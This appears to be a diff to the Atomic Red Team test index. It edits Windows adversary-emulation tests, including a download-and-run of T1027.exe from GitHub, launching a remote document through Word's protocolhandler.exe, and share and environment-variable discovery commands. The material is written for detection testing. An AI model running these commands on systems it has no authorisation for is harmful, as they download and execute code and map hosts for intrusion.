@@ -18820,6 +18820,7 @@ credential-access:
         prereq_command: |
           try {
             New-Object -COMObject "word.Application" | Out-Null
+            $process = "winword"
             Stop-Process -Name $process
             exit 0
           } catch { exit 1 }
@@ -35767,20 +35768,17 @@ defense-evasion:
       supported_platforms:
       - windows
       input_arguments:
-        exe_payload:
-          description: EXE to execute
-          type: Path
-          default: "%temp%\\temp_T1027.zip\\T1027.exe"
         url_path:
           description: url to download Exe
           type: url
           default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/T1027.zip
       dependency_executor_name: powershell
       dependencies:
-      - description: 'T1027.exe must exist on disk at specified location
+      - description: 'T1027.exe must exist on disk at $env:temp\temp_T1027.zip\T1027.exe
 
 '
-        prereq_command: 'if (Test-Path #{exe_payload}) {exit 0} else {exit 1}
+        prereq_command: 'if (Test-Path $env:temp\temp_T1027.zip\T1027.exe) {exit 0}
+          else {exit 1}
 
 '
         get_prereq_command: |
@@ -35788,7 +35786,7 @@ defense-evasion:
           Invoke-WebRequest "#{url_path}" -OutFile "$env:temp\T1027.zip"
           Expand-Archive -path "$env:temp\T1027.zip" -DestinationPath "$env:temp\temp_T1027.zip\" -Force
       executor:
-        command: '"#{exe_payload}"
+        command: '"%temp%\temp_T1027.zip\T1027.exe"
 
 '
         cleanup_command: |
@@ -40006,10 +40004,6 @@ defense-evasion:
       supported_platforms:
       - windows
       input_arguments:
-        microsoft_wordpath:
-          description: path to office folder
-          type: path
-          default: C:\Program Files\Microsoft Office\Office16
         remote_url:
           description: url to document
           type: url
@@ -40020,8 +40014,8 @@ defense-evasion:
           must be provided
 
 '
-        prereq_command: 'if (Test-Path "#{microsoft_wordpath}\protocolhandler.exe")
-          {exit 0} else {exit 1}
+        prereq_command: 'if (Test-Path "(Resolve-Path "C:\Program Files*\Microsoft
+          Office\root\Office16")\protocolhandler.exe") {exit 0} else {exit 1}
 
 '
         get_prereq_command: 'write-host "Install Microsoft Word or provide correct
@@ -40031,9 +40025,9 @@ defense-evasion:
       executor:
         name: command_prompt
         elevation_required: false
-        command: '"#{microsoft_wordpath}\protocolhandler.exe" "ms-word:nft|u|#{remote_url}"
-
-'
+        command: |
+          FOR /F "tokens=2*" %a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe" /V PATH') do set microsoft_wordpath=%b
+          call "%microsoft_wordpath%\protocolhandler.exe" "ms-word:nft|u|#{remote_url}"
     - name: Microsoft.Workflow.Compiler.exe Payload Execution
       auto_generated_guid: 7cbb0f26-a4c1-4f77-b180-a009aa05637e
       description: 'Emulates attack with Microsoft.Workflow.Compiler.exe running a
@@ -46922,15 +46916,10 @@ discovery:
         Upon execution, avalaible network shares will be displayed in the powershell session
       supported_platforms:
       - windows
-      input_arguments:
-        computer_name:
-          description: Computer name to find a mount on.
-          type: string
-          default: localhost
       executor:
-        command: |
-          net view \\#{computer_name}
-          get-smbshare -Name #{computer_name}
+        command: 'get-smbshare
+
+'
         name: powershell
     - name: View available share drives
       auto_generated_guid: ab39a04f-0c93-4540-9ff2-83f862c385ae
@@ -48432,6 +48421,19 @@ discovery:
         command: 'cscript #{vbscript}'
         name: powershell
         elevation_required: false
+    - name: Environment variables discovery
+      auto_generated_guid: f400d1c0-1804-4ff8-b069-ef5ddd2adbf3
+      description: 'Identify all environment variables. Upon execution, environments
+        variables and your path info will be displayed.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: 'set
+
+'
+        name: command_prompt
   T1016:
     technique:
       id: attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0
@@ -54985,6 +54987,7 @@ execution:
           description: Path to PsExec
           type: string
           default: C:\PSTools\PsExec.exe
+      dependency_executor_name: powershell
       dependencies:
       - description: 'PsExec tool from Sysinternals must exist on disk at specified
           location (#{psexec_exe})
